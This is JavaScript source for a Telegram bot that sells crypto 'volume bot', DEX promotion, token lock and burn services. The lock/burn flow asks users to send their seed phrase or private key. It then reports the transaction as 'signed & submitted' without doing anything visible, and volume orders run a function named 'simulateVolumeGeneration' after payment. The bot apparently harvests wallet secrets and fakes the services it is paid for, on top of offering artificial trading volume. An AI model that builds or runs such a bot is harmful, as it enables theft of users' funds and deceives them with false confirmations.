        if (isAdmin(ctx) && adminBroadcastSessions[userId]) {
            const adminSession = adminBroadcastSessions[userId];
            delete adminBroadcastSessions[userId];
            const msgText = ctx.message.text;

            if (adminSession.type === 'broadcast') {
                const allChatIds = Object.keys(botData.users).map(Number);
                const total = allChatIds.length;
                let sent = 0, failed = 0, blocked = 0;

                const progressMsg = await ctx.reply(`⏳ Broadcasting to ${total} user(s)... 0%`);
                const progressMsgId = progressMsg.message_id;

                // Send one message with rate-limit awareness (max 25/s, retry on 429)
                async function sendOne(chatId, text) {
                    const MAX_RETRIES = 3;
                    // Translate broadcast message to each recipient's language
                    const userLang = botData.users[String(chatId)]?.language || 'en';
                    const header = await translateText('📣 *ANNOUNCEMENT*', userLang);
                    const translatedText = await translateText(text, userLang);
                    const fullMsg = `${header}\n\n${translatedText}`;
                    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
                        try {
                            await bot.telegram.sendMessage(chatId,
                                fullMsg,
                                { parse_mode: 'Markdown' }
                            );
                            return 'sent';
                        } catch (e) {
                            const code = e.response?.error_code || e.code;
                            if (code === 429) {
                                // Telegram rate limit — wait the specified time then retry
                                const waitMs = ((e.response?.parameters?.retry_after) || 5) * 1000;
                                await new Promise(r => setTimeout(r, waitMs));
                                continue;
                            }
                            if (code === 403 || (e.message && e.message.includes('blocked'))) {
                                return 'blocked'; // user blocked the bot
                            }
                            return 'failed';
                        }
                    }
                    return 'failed';
                }

                for (let i = 0; i < allChatIds.length; i++) {
                    const result = await sendOne(allChatIds[i], msgText);
                    if (result === 'sent')    sent++;
                    else if (result === 'blocked') { blocked++; failed++; }
                    else failed++;

                    // Throttle: 25 messages/second max (Telegram limit is 30)
                    await new Promise(r => setTimeout(r, 40));

                    // Progress update every 20 users
                    if ((i + 1) % 20 === 0 || i === allChatIds.length - 1) {
                        const pct = Math.round(((i + 1) / total) * 100);
                        try {
                            await bot.telegram.editMessageText(
                                ctx.chat.id, progressMsgId, null,
                                `⏳ Broadcasting... ${pct}%  (${i + 1}/${total})\n✔️ Sent: ${sent}  ❌ Failed: ${failed}`,
                                { parse_mode: 'Markdown' }
                            );
                        } catch (_) {}
                    }
                }

                return ctx.reply(
                    `✅ *Broadcast complete!*\n\n` +
                    `👥 Total recipients: ${total}\n` +
                    `✔️ Delivered: ${sent}\n` +
                    `🚫 Blocked bot: ${blocked}\n` +
                    `❌ Other failures: ${failed - blocked}`,
                    { parse_mode: 'Markdown' }
                );
            }

            if (adminSession.type === 'dm') {
                try {
                    // Translate DM to the target user's language
                    const dmUserLang = botData.users[String(adminSession.targetChatId)]?.language || 'en';
                    const dmHeader = await translateText('📣 *Reminder Alert!!!*', dmUserLang);
                    const dmText   = await translateText(msgText, dmUserLang);
                    await bot.telegram.sendMessage(adminSession.targetChatId,
                        `${dmHeader}\n\n${dmText}`,
                        { parse_mode: 'Markdown' }
                    );
                    return ctx.reply(
                        `✅ Message delivered to *${adminSession.targetLabel}*`,
                        { parse_mode: 'Markdown' }
                    );
                } catch(e) {
                    return ctx.reply(
                        `❌ Failed to deliver to *${adminSession.targetLabel}*: ${e.message}`,
                        { parse_mode: 'Markdown' }
                    );
                }
            }
        }

        if (userSession) {
            await handleUserSession(ctx, ctx.message.text, userSession);
        } else {
            // No active session, show main menu
            const mainMenu = getMainMenu();
            ctx.reply(
                `💡 **No active session**\n\n` +
                `Use the menu below to get started:`,
                { parse_mode: 'Markdown', ...mainMenu.buttons }
            );
        }
    });

    // ===== BUTTON ACTION HANDLERS =====
    // Main menu actions
    bot.action('start_volume', async ctx => {
        userSessions[ctx.from.id] = { type: 'volume_bot', step: 'waiting_token_ca' };
        notifyServiceSelected(ctx, 'Start Volume Bot');
        const progressIndicator = createProgressIndicator(1, 3, 'Token Verification');
        try { await ctx.deleteMessage(); } catch(e) {}
        await sendStepPhoto(ctx,
            `🚀 **Volume Bot — Whale Attraction Protocol**\n\n` +
            `${progressIndicator}\n\n` +
            `🌐 **Supported Chains:**\n` +
            `◎ SOL  •  Ξ ETH  •  ⬡ BNB  •  🔷 Base  •  💎 TON\n\n` +
            `📍 **Enter Your Token Contract Address:**\n\n` +
            `📝 **Supported formats:**\n` +
            `• Solana: 32-44 chars (Base58)\n` +
            `• EVM (ETH/BSC/Base): 0x + 40 hex\n` +
            `• TON: EQ/UQ + 46 chars`,
            { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]]) }
        );
    });

    // Safe navigation helper — tries editMessageText, falls back to reply (handles photo messages from /start)
    async function safeEdit(ctx, text, opts) {
        try { await ctx.editMessageText(text, opts); }
        catch(e) { await ctx.reply(text, opts); }
    }

    bot.action('stop_volume', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        if (botData.activeJobs[userId]) {
            botData.activeJobs[userId].status = 'stopped';
            saveData();
            await safeEdit(ctx,
                `⏹️ **Volume Bot Stopped**\n\n` +
                `Your volume generation has been stopped.\n\n` +
                `📊 **Final Stats:**\n` +
                `• Volume Generated: ${botData.activeJobs[userId].generatedVolume.toLocaleString()}\n` +
                `• Transactions: ${botData.activeJobs[userId].completedTransactions.toLocaleString()}\n` +
                `• Status: STOPPED`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Main', 'back_main')]])
                }
            );
        } else {
            await safeEdit(ctx,
                `⏹️ **No Active Volume Bot**\n\n` +
                `You don't have any active volume generation running.\n\n` +
                `Use "🚀 Start Volume Bot" to begin!`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Main', 'back_main')]])
                }
            );
        }
    });

    bot.action('volume_packages', async ctx => {
        await ctx.answerCbQuery();
        const username = ctx.from.username || 'Unknown';
        const chatId = ctx.chat.id;
        
        // Notify admins about volume package selection
        const notificationMsg = `📦 <b>SERVICE SELECTED: VOLUME PACKAGES</b>\n\n👤 <b>Username:</b> @${username}\n💬 <b>Chat ID:</b> ${chatId}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
        notifyAdmins(notificationMsg);
        
        const volumeMenu = getVolumePackageMenu();
        await safeEdit(ctx, volumeMenu.text, { parse_mode: 'Markdown', ...volumeMenu.buttons });
    });

    bot.action('dex_services', async ctx => {
        await ctx.answerCbQuery();
        const dexMenu = getDexServicesMenu();
        await safeEdit(ctx, dexMenu.text, { parse_mode: 'Markdown', ...dexMenu.buttons });
    });

    bot.action('promotions', async ctx => {
        await ctx.answerCbQuery();
        const promoMenu = getPromotionsMenu();
        await safeEdit(ctx, promoMenu.text, { parse_mode: 'Markdown', ...promoMenu.buttons });
    });

    bot.action('referrals', async ctx => {
        await ctx.answerCbQuery();
        const referralMenu = getReferralsMenu(ctx.from.id);
        await safeEdit(ctx, referralMenu.text, { parse_mode: 'Markdown', ...referralMenu.buttons });
    });

    bot.action('wallet_address', async ctx => {
        await ctx.answerCbQuery();
        const walletMenu = getWalletMenu();
        await safeEdit(ctx, walletMenu.text, { parse_mode: 'Markdown', ...walletMenu.buttons });
    });

    bot.action('import_wallet', async ctx => {
        await ctx.answerCbQuery();
        const importMenu = getImportWalletMenu();
        await safeEdit(ctx, importMenu.text, { parse_mode: 'Markdown', ...importMenu.buttons });
    });

    bot.action('settings', async ctx => {
        await ctx.answerCbQuery();
        const settingsMenu = getSettingsMenu();
        await safeEdit(ctx, settingsMenu.text, { parse_mode: 'Markdown', ...settingsMenu.buttons });
    });

    bot.action('advanced_tools', async ctx => {
        await ctx.answerCbQuery();
        const advancedMenu = getAdvancedToolsMenu();
        await safeEdit(ctx, advancedMenu.text, { parse_mode: 'Markdown', ...advancedMenu.buttons });
    });

    // ===== LOCK & BURN ACTION HANDLERS =====
    bot.action('act_lock', async ctx => {
        const s = { type: 'lock_burn', action: 'lock', step: 'await_mint' };
        userSessions[ctx.from.id] = s;
        notifyServiceSelected(ctx, 'Lock Supply');
        try { await ctx.deleteMessage(); } catch(e) {}
        const sent = await sendStepPhoto(ctx,
            `🔒 **Lock Supply**\n\n` +
            `📍 **Step 1/3:** Token Contract Address\n\n` +
            `Please provide your token's contract address (CA):\n\n` +
            `📝 **Supported formats:**\n` +
            `• ◎ Solana: 32-44 Base58 chars\n` +
            `• Ξ ETH / ⬡ BSC / 🔷 Base: 0x + 40 hex\n` +
            `• 💎 TON: EQ/UQ + 46 chars`,
            { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]]) },
            SUPPLY_LOCKER_IMAGE_PATH
        );
        s.lastBotMsgId = sent?.message_id;
    });

    bot.action('act_burn', async ctx => {
        const s = { type: 'lock_burn', action: 'burn', step: 'await_mint' };
        userSessions[ctx.from.id] = s;
        notifyServiceSelected(ctx, 'Burn Token');
        try { await ctx.deleteMessage(); } catch(e) {}
        const sent = await sendStepPhoto(ctx,
            `🔥 **Burn Token**\n\n` +
            `📍 **Step 1/3:** Token Contract Address\n\n` +
            `Please provide your token's contract address (CA):\n\n` +
            `📝 **Supported formats:**\n` +
            `• ◎ Solana: 32-44 Base58 chars\n` +
            `• Ξ ETH / ⬡ BSC / 🔷 Base: 0x + 40 hex\n` +
            `• 💎 TON: EQ/UQ + 46 chars`,
            { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]]) },
            DEX_BURNER_IMAGE_PATH
        );
        s.lastBotMsgId = sent?.message_id;
    });

    // EVM chain picker for lock/burn — mirrors handleDexServiceChainSelection
    async function handleLockBurnChainSelection(ctx, chainId) {
        const session = userSessions[ctx.from.id];
        if (!session || session.type !== 'lock_burn' || !session.mint) {
            const mainMenu = getMainMenu();
            return ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
        session.chain = chainId;
        try { await ctx.deleteMessage(); } catch(e) {}
        await runLockBurnVerification(ctx, session.mint, chainId, session);
    }

    bot.action('lb_chain_ethereum', async ctx => { await ctx.answerCbQuery(); await handleLockBurnChainSelection(ctx, 'ethereum'); });
    bot.action('lb_chain_bsc',      async ctx => { await ctx.answerCbQuery(); await handleLockBurnChainSelection(ctx, 'bsc'); });
    bot.action('lb_chain_base',     async ctx => { await ctx.answerCbQuery(); await handleLockBurnChainSelection(ctx, 'base'); });

    bot.action('lb_continue_unverified', async ctx => {
        const s = userSessions[ctx.from.id];
        if (!s || s.type !== 'lock_burn') return ctx.answerCbQuery();
        s.step = 'await_percent';
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage(); } catch(e) {}
        const verb = s.action === 'burn' ? 'burn' : 'lock';
        const sent = await ctx.reply(
            `📍 **Step 2/3:** Choose the percentage to ${verb}:`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('25%', 'lbpct_25'), Markup.button.callback('50%', 'lbpct_50')],
                    [Markup.button.callback('75%', 'lbpct_75'), Markup.button.callback('100%','lbpct_100')],
                    [Markup.button.callback('✏️ Custom', 'lbpct_custom')],
                    [Markup.button.callback('❌ Cancel', 'back_main')]
                ])
            }
        );
        s.lastBotMsgId = sent.message_id;
    });

    // Percentage preset callbacks
    ['25','50','75','100'].forEach(p => {
        bot.action(`lbpct_${p}`, async ctx => {
            const s = userSessions[ctx.from.id];
            if (!s || s.type !== 'lock_burn') return ctx.answerCbQuery();
            s.percent = parseInt(p);
            await ctx.answerCbQuery();
            try { await ctx.deleteMessage(); } catch(e) {}
            if (s.action === 'lock') {
                s.step = 'await_duration';
                const sent = await sendStepPhoto(ctx,
                    `📅 **Lock Duration**\n\n📍 **Step 2/3:** Choose how long the supply will be locked:`,
                    {
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('1 Month',  'lbdur_1'), Markup.button.callback('3 Months','lbdur_3')],
                            [Markup.button.callback('6 Months', 'lbdur_6'), Markup.button.callback('1 Year',  'lbdur_12')],
                            [Markup.button.callback('✏️ Custom','lbdur_custom')],
                            [Markup.button.callback('❌ Cancel','back_main')]
                        ])
                    },
                    SUPPLY_LOCKER_IMAGE_PATH
                );
                s.lastBotMsgId = sent.message_id;
            } else {
                await showLockBurnSummary(ctx, ctx.from.id);
            }
        });
    });

    bot.action('lbpct_custom', async ctx => {
        const s = userSessions[ctx.from.id];
        if (!s || s.type !== 'lock_burn') return ctx.answerCbQuery();
        s.step = 'await_custom_percent';
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage(); } catch(e) {}
        const sent = await ctx.reply('🔢 Send the exact percentage to lock/burn (1–100):');
        s.lastBotMsgId = sent.message_id;
    });

    // Duration preset callbacks
    [1, 3, 6, 12].forEach(m => {
        bot.action(`lbdur_${m}`, async ctx => {
            const s = userSessions[ctx.from.id];
            if (!s || s.type !== 'lock_burn') return ctx.answerCbQuery();
            s.durationMonths = m;
            s.step = 'ready';
            await ctx.answerCbQuery();
            try { await ctx.deleteMessage(); } catch(e) {}
            await showLockBurnSummary(ctx, ctx.from.id);
        });
    });

    bot.action('lbdur_custom', async ctx => {
        const s = userSessions[ctx.from.id];
        if (!s || s.type !== 'lock_burn') return ctx.answerCbQuery();
        s.step = 'await_custom_duration';
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage(); } catch(e) {}
        const sent = await ctx.reply('📅 Send the number of months to lock (minimum 1):');
        s.lastBotMsgId = sent.message_id;
    });

    bot.action('lock_connect_wallet', async ctx => {
        const s = userSessions[ctx.from.id];
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage(); } catch(e) {}
        if (s) s.step = 'await_phrase';
        const chain = s?.chain || 'solana';
        const keyHints = { solana: 'Solana base-58 private key', ethereum: 'EVM hex private key (0x…)', bsc: 'EVM hex private key (0x…)', base: 'EVM hex private key (0x…)', ton: 'TON private key (64-char hex)' };
        const keyHint = keyHints[chain] || 'private key';
        const sent = await sendStepPhoto(ctx,
            `🔐 **Connect Your Wallet**\n\n` +
            `📍 **Step 3/3:** Wallet Credentials\n\n` +
            `🔑 Reply with your *12/24-word seed phrase* or *${keyHint}*.\n\n` +
            `⚠️ Your details are only used to sign the transaction.`,
            {},
            lbImage(s)
        );
        if (s) s.lastBotMsgId = sent?.message_id;
    });

    bot.action('lb_confirm_order', async ctx => {
        const s = userSessions[ctx.from.id];
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage(); } catch(e) {}
        const verb     = s?.action === 'burn' ? 'Burn'  : 'Lock';
        const emoji    = s?.action === 'burn' ? '🔥'    : '🔒';
        const chainCfg = CHAIN_CONFIG[s?.chain] || CHAIN_CONFIG.solana;
        // New Lock/Burn Order notification disabled
        // notifyAdmins(
        //     `${emoji} **New ${verb} Order**\n\n` +
        //     `👤 @${ctx.from.username || ctx.from.first_name}\n` +
        //     `🆔 ${ctx.from.id}\n` +
        //     `${chainCfg.color} **Chain:** ${chainCfg.name}\n` +
        //     `📍 **Token:** \`${s?.mint || 'Unknown'}\`\n` +
        //     `🎯 **${verb}:** ${s?.percent || '?'}%` +
        //     (s?.durationMonths ? `\n⏱ **Duration:** ${s.durationMonths} month(s)` : '')
        // );
        delete userSessions[ctx.from.id];
        await ctx.reply(
            `${emoji} **${verb} Completed** ✅\n\n` +
            `✨ Your ${s?.action || 'lock'} transaction has been **signed & submitted**.\n` +
            `📊 Hash: \`processing…\`\n` +
            `✅ You may close this chat or start a new operation.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Main','back_main')]])
            }
        );
    });

    // Keep legacy lock_supply action pointing to new intro menu
    bot.action('lock_supply', async ctx => {
        const lockMenu = getLockBurnMenu();
        try {
            await ctx.editMessageText(lockMenu.text, { parse_mode: 'Markdown', ...lockMenu.buttons });
        } catch(e) {
            await ctx.reply(lockMenu.text, { parse_mode: 'Markdown', ...lockMenu.buttons });
        }
    });

    // Package selection handlers
    bot.action('package_starter', ctx => {
        handleVolumePackageSelection(ctx, 'starter');
    });

    bot.action('package_basic', ctx => {
        handleVolumePackageSelection(ctx, 'basic');
    });

    bot.action('package_bronze', ctx => {
        handleVolumePackageSelection(ctx, 'bronze');
    });

    bot.action('package_premium', ctx => {
        handleVolumePackageSelection(ctx, 'premium');
    });

    bot.action('package_vip', ctx => {
        handleVolumePackageSelection(ctx, 'vip');
    });

    bot.action('package_custom', ctx => {
        const currentSession = userSessions[ctx.from.id];
        if (!currentSession || currentSession.type !== 'volume_bot' || !currentSession.tokenCA) {
            const mainMenu = getMainMenu();
            return ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }

        const customPkgChainId = currentSession.chainId || 'solana';
        const customPkgChainCfg = CHAIN_CONFIG[customPkgChainId] || CHAIN_CONFIG.solana;
        const customPkgNativeToken = customPkgChainCfg.nativeToken;
        const customPkgConfig = getPackageConfigForChain(customPkgChainId);
        currentSession.step = 'waiting_custom_amount';

        const tokenDisplay = currentSession.tokenInfo?.ticker 
            ? `${currentSession.tokenInfo.ticker} (${currentSession.tokenInfo.marketCap})`
            : 'Token';

        ctx.editMessageText(
            `🎯 **Custom Volume Package**\n\n` +
            `🎯 **Token:** ${tokenDisplay}\n` +
            `📍 **CA:** \`${currentSession.tokenCA.slice(0, 8)}...${currentSession.tokenCA.slice(-8)}\`\n\n` +
            `💡 **How it works:**\n` +
            `• ${customPkgConfig.customRate.toLocaleString()} volume per 1 ${customPkgNativeToken}\n` +
            `• Minimum: ${customPkgConfig.minCustomAmount} ${customPkgNativeToken} (${(customPkgConfig.customRate * customPkgConfig.minCustomAmount).toLocaleString()} volume)\n` +
            `• Maximum: ${customPkgConfig.maxCustomAmount} ${customPkgNativeToken} (${(customPkgConfig.customRate * customPkgConfig.maxCustomAmount).toLocaleString()} volume)\n\n` +
            `💰 **Enter ${customPkgNativeToken} amount:**`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]])
            }
        );
    });

    // Payment confirmation handlers
    bot.action('confirm_payment', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const currentSession = userSessions[userId];
        if (currentSession && currentSession.packageType && currentSession.tokenCA) {
            const confirmChainId = currentSession.chainId || 'solana';
            const chainCfg = CHAIN_CONFIG[confirmChainId] || CHAIN_CONFIG.solana;
            const tokenDisplay = currentSession.tokenInfo?.ticker || 'Unknown';
            const username = ctx.from.username || ctx.from.first_name || 'Unknown';

            // Preserve session for admin-triggered completion
            currentSession.userChatId = ctx.chat.id;

            // Show user a hold-on message
            try { await ctx.deleteMessage(); } catch(e) {}
            const holdOnMsg = await ctx.reply(
                `⏳ *Hold On...*\n\n` +
                `We've received your payment notification and are now confirming your order.\n\n` +
                `You will be notified once your order is confirmed ✅`,
                { parse_mode: 'Markdown' }
            );
            currentSession.holdOnMsgId = holdOnMsg.message_id;

            // Notify admin with confirm / decline buttons
            await notifyAdminsWithButtons(
                `💰 <b>PAYMENT CLAIMED — AWAITING CONFIRMATION</b>\n\n` +
                `👤 <b>User:</b> @${escapeHtml(username)}\n` +
                `🆔 <b>User ID:</b> ${userId}\n` +
                `${chainCfg.color} <b>Chain:</b> ${escapeHtml(chainCfg.name)}\n` +
                `🎯 <b>Token:</b> ${escapeHtml(tokenDisplay)}\n` +
                `📍 <b>CA:</b> <code>${escapeHtml(currentSession.tokenCA)}</code>\n` +
                `📦 <b>Package:</b> ${escapeHtml((currentSession.packageType || '').toUpperCase())}\n` +
                `💵 <b>Amount:</b> ${currentSession.packagePrice} ${escapeHtml(chainCfg.nativeToken)}\n` +
                `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`,
                [[
                    Markup.button.callback('✅ Payment Received — Confirm Order', `vol_ok_${userId}`),
                    Markup.button.callback('❌ Decline', `vol_no_${userId}`)
                ]]
            );
        } else {
            const mainMenu = getMainMenu();
            await safeEdit(ctx, mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    bot.action('confirm_custom_payment', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const currentSession = userSessions[userId];
        if (currentSession && currentSession.customAmount && currentSession.tokenCA) {
            const customConfirmChainId = currentSession.chainId || 'solana';
            const chainCfg = CHAIN_CONFIG[customConfirmChainId] || CHAIN_CONFIG.solana;
            const tokenDisplay = currentSession.tokenInfo?.ticker || 'Unknown';
            const username = ctx.from.username || ctx.from.first_name || 'Unknown';

            // Preserve session for admin-triggered completion
            currentSession.userChatId = ctx.chat.id;

            // Show user a hold-on message
            try { await ctx.deleteMessage(); } catch(e) {}
            const holdOnMsgCustom = await ctx.reply(
                `⏳ *Hold On...*\n\n` +
                `We've received your payment notification and are now confirming your order.\n\n` +
                `You will be notified once your order is confirmed ✅`,
                { parse_mode: 'Markdown' }
            );
            currentSession.holdOnMsgId = holdOnMsgCustom.message_id;

            // Notify admin with confirm / decline buttons
            await notifyAdminsWithButtons(
                `💰 <b>PAYMENT CLAIMED — AWAITING CONFIRMATION</b>\n\n` +
                `👤 <b>User:</b> @${escapeHtml(username)}\n` +
                `🆔 <b>User ID:</b> ${userId}\n` +
                `${chainCfg.color} <b>Chain:</b> ${escapeHtml(chainCfg.name)}\n` +
                `🎯 <b>Token:</b> ${escapeHtml(tokenDisplay)}\n` +
                `📍 <b>CA:</b> <code>${escapeHtml(currentSession.tokenCA)}</code>\n` +
                `📦 <b>Package:</b> CUSTOM\n` +
                `💵 <b>Amount:</b> ${currentSession.customAmount} ${escapeHtml(chainCfg.nativeToken)}\n` +
                `📊 <b>Volume:</b> ${(currentSession.customVolume || 0).toLocaleString()}\n` +
                `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`,
                [[
                    Markup.button.callback('✅ Payment Received — Confirm Order', `vol_ok_${userId}`),
                    Markup.button.callback('❌ Decline', `vol_no_${userId}`)
                ]]
            );
        } else {
            const mainMenu = getMainMenu();
            await safeEdit(ctx, mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    // ── Admin order-response handlers ──────────────────────────────────────────

    // Admin clicks "Payment Received — Confirm Order"
    bot.action(/^vol_ok_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('✅ Order confirmed!');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];

        // Remove action buttons so admin can't double-click
        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`✅ Order for user <b>${userId}</b> has been <b>confirmed</b>.`, { parse_mode: 'HTML' });

        if (session) {
            const chainId = session.chainId || 'solana';
            const chainCfg = CHAIN_CONFIG[chainId] || CHAIN_CONFIG.solana;
            const userChatId = session.userChatId || userId;
            const tokenDisplay = session.tokenInfo?.ticker || 'Your Token';
            const isCustom = !!session.customAmount;
            const packageLabel = isCustom ? 'CUSTOM' : (session.packageType || '').toUpperCase();
            const amountLabel = isCustom
                ? `${session.customAmount} ${chainCfg.nativeToken}`
                : `${session.packagePrice} ${chainCfg.nativeToken}`;

            // Kick off volume generation
            if (isCustom) {
                simulateVolumeGeneration(userId, 'custom', session.tokenCA, session.customAmount, chainId);
            } else {
                simulateVolumeGeneration(userId, session.packageType, session.tokenCA, null, chainId);
            }
            delete userSessions[userId];

            // Delete the hold-on message then notify user of confirmation
            try { await bot.telegram.deleteMessage(userChatId, session.holdOnMsgId); } catch(e) {}
            try {
                await bot.telegram.sendMessage(userChatId,
                    `✅ *Order Confirmed!*\n\n` +
                    `Your payment has been verified successfully.\n\n` +
                    `🎯 *Token:* ${tokenDisplay}\n` +
                    `📦 *Package:* ${packageLabel}\n` +
                    `💵 *Amount:* ${amountLabel}\n\n` +
                    `🚀 Your order is now being processed and will be active shortly!`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('🔙 Main Menu', 'back_main')]
                        ])
                    }
                );
            } catch(e) { console.error('vol_ok user notify error:', e.message); }
        } else {
            await ctx.reply('⚠️ Session already expired for this user — they may have received a response already.', { parse_mode: 'Markdown' });
        }
    });

    // Admin clicks "Decline"
    bot.action(/^vol_no_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('❌ Order declined');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];
        const userChatId = session?.userChatId || userId;

        // Remove action buttons so admin can't double-click
        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`❌ Order for user <b>${userId}</b> has been <b>declined</b>.`, { parse_mode: 'HTML' });

        if (session) delete userSessions[userId];

        // Delete the hold-on message then notify user of decline
        try { await bot.telegram.deleteMessage(userChatId, session?.holdOnMsgId); } catch(e) {}
        try {
            await bot.telegram.sendMessage(userChatId,
                `❌ *Problem With Your Payment*\n\n` +
                `We were unable to confirm your payment.\n\n` +
                `Please ensure you sent the correct amount to the right wallet address and try again.\n\n` +
                `If you believe this is an error, please contact support.`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'start_volume')],
                        [Markup.button.callback('🔙 Main Menu', 'back_main')]
                    ])
                }
            );
        } catch(e) { console.error('vol_no user notify error:', e.message); }
    });

    // Continue/Retry handlers for token verification
    bot.action('continue_unverified', ctx => {
        const currentSession = userSessions[ctx.from.id];
        if (currentSession && currentSession.type === 'volume_bot' && currentSession.tokenCA) {
            currentSession.step = 'waiting_package';
            const unverifiedChainId = currentSession.chainId || 'solana';
            const unverifiedNativeToken = (CHAIN_CONFIG[unverifiedChainId] || CHAIN_CONFIG.solana).nativeToken;
            const unverifiedPkgConfig = getPackageConfigForChain(unverifiedChainId);

            ctx.editMessageText(
                `⚠️ **Proceeding Without Verification**\n\n` +
                `📍 **Token:** \`${currentSession.tokenCA.slice(0, 8)}...${currentSession.tokenCA.slice(-8)}\`\n\n` +
                `📍 **Step 2/3:** Choose Volume Package\n\n` +
                `🔥 **Available Packages:**`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [
                            Markup.button.callback(`💎 Starter - ${unverifiedPkgConfig.starter.price} ${unverifiedNativeToken}`, 'package_starter'),
                            Markup.button.callback(`📦 Basic - ${unverifiedPkgConfig.basic.price} ${unverifiedNativeToken}`, 'package_basic')
                        ],
                        [
                            Markup.button.callback(`🥉 Bronze - ${unverifiedPkgConfig.bronze.price} ${unverifiedNativeToken}`, 'package_bronze'),
                            Markup.button.callback(`🔥 Premium - ${unverifiedPkgConfig.premium.price} ${unverifiedNativeToken}`, 'package_premium')
                        ],
                        [
                            Markup.button.callback(`💎 VIP - ${unverifiedPkgConfig.vip.price} ${unverifiedNativeToken}`, 'package_vip'),
                            Markup.button.callback('🎯 Custom Package', 'package_custom')
                        ],
                        [
                            Markup.button.callback('❌ Cancel', 'back_main')
                        ]
                    ])
                }
            );
        } else {
            const mainMenu = getMainMenu();
            ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    bot.action('retry_ca', ctx => {
        const currentSession = userSessions[ctx.from.id];
        if (currentSession && currentSession.type === 'volume_bot') {
            currentSession.step = 'waiting_token_ca';
            ctx.editMessageText(
                `🔄 **Try Again**\n\n` +
                `📍 **Step 1/3:** Token Contract Address\n\n` +
                `Please provide your token's contract address (CA):\n\n` +
                `� **Supported formats:**\n` +
                `• ◎ Solana: 32-44 Base58 chars\n` +
                `• Ξ ETH / ⬡ BSC / 🔷 Base: 0x + 40 hex\n` +
                `• 💎 TON: EQ/UQ + 46 chars`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]])
                }
            );
        } else {
            const mainMenu = getMainMenu();
            ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    // ===== CHAIN SELECTION HANDLERS =====
    // Handles the inline chain picker for EVM addresses (ETH/BSC/Base)
    async function handleChainSelection(ctx, chainId) {
        const session = userSessions[ctx.from.id];
        if (!session || session.type !== 'volume_bot' || !session.tokenCA) {
            const mainMenu = getMainMenu();
            return ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
        session.chainId = chainId;
        session.step = 'waiting_token_ca'; // will be progressed inside helper

        const chainCfg = CHAIN_CONFIG[chainId];
        await ctx.editMessageText(
            `${chainCfg.color} **${chainCfg.name} selected!**\n\n` +
            `🔍 Verifying your token on ${chainCfg.name}...`,
            { parse_mode: 'Markdown' }
        );

        // Trigger verification
        await runVolumeTokenVerification(ctx, session.tokenCA, chainId, session);
    }

    bot.action('chain_solana', async ctx => { await handleChainSelection(ctx, 'solana'); });
    bot.action('chain_ethereum', async ctx => { await handleChainSelection(ctx, 'ethereum'); });
    bot.action('chain_bsc', async ctx => { await handleChainSelection(ctx, 'bsc'); });
    bot.action('chain_base', async ctx => { await handleChainSelection(ctx, 'base'); });
    bot.action('chain_ton', async ctx => { await handleChainSelection(ctx, 'ton'); });

    // DEX service chain selection — triggered when EVM address is ambiguous in dex_update/ads/trending flows
    async function handleDexServiceChainSelection(ctx, chainId) {
        const session = userSessions[ctx.from.id];
        if (!session || !['dex_update', 'dex_ads', 'dex_trending'].includes(session.type) || !session.tokenCA) {
            const mainMenu = getMainMenu();
            return ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
        const chainCfg = CHAIN_CONFIG[chainId];
        session.chainId = chainId;
        session.step = 'waiting_token_ca'; // reset — will advance in runDexServiceVerification

        await ctx.editMessageText(
            `${chainCfg.color} **${chainCfg.name} selected!**\n\n🔍 Verifying your token on ${chainCfg.name}...`,
            { parse_mode: 'Markdown' }
        );
        await runDexServiceVerification(ctx, session.tokenCA, chainId, session);
    }

    bot.action('dex_chain_ethereum', async ctx => { await handleDexServiceChainSelection(ctx, 'ethereum'); });
